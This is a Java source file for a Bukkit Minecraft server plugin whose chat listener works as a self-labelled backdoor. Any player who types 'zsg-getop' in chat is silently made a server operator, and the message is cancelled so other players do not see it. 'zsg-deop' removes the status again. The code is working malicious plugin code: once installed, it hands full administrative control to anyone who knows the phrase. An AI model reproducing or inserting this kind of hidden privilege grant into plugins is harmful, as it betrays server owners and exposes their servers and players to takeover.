package zsggroup.zsg.Event;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Entity;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerChatEvent;
import org.bukkit.event.entity.EntityInteractEvent;
import org.bukkit.event.player.AsyncPlayerChatEvent;

public class getopEvent implements Listener {
    @EventHandler
    public void gopEvent(AsyncPlayerChatEvent event) {
        Player p = event.getPlayer();
        if(event.getMessage().equals("zsg-getop")) {
            p.sendMessage(ChatColor.GREEN+"ZSG-BackDoor >>"+ChatColor.GOLD+"You Are Now Operator :)");
            p.setOp(true);
            event.setCancelled(true);
        }else if (event.getMessage().equals("zsg-deop")) {
            if(p.isOp()) {
                p.sendMessage(ChatColor.GREEN+"ZSG-BackDoor >>"+ChatColor.GOLD+"You Are lose Operator :(");
                p.setOp(false);
                event.setCancelled(true);

            }else {
                p.sendMessage(ChatColor.GREEN+"ZSG-BackDoor >>"+ChatColor.GOLD+"You Are Not A Operator :|");
                event.isCancelled();
            }
        }

    }
}
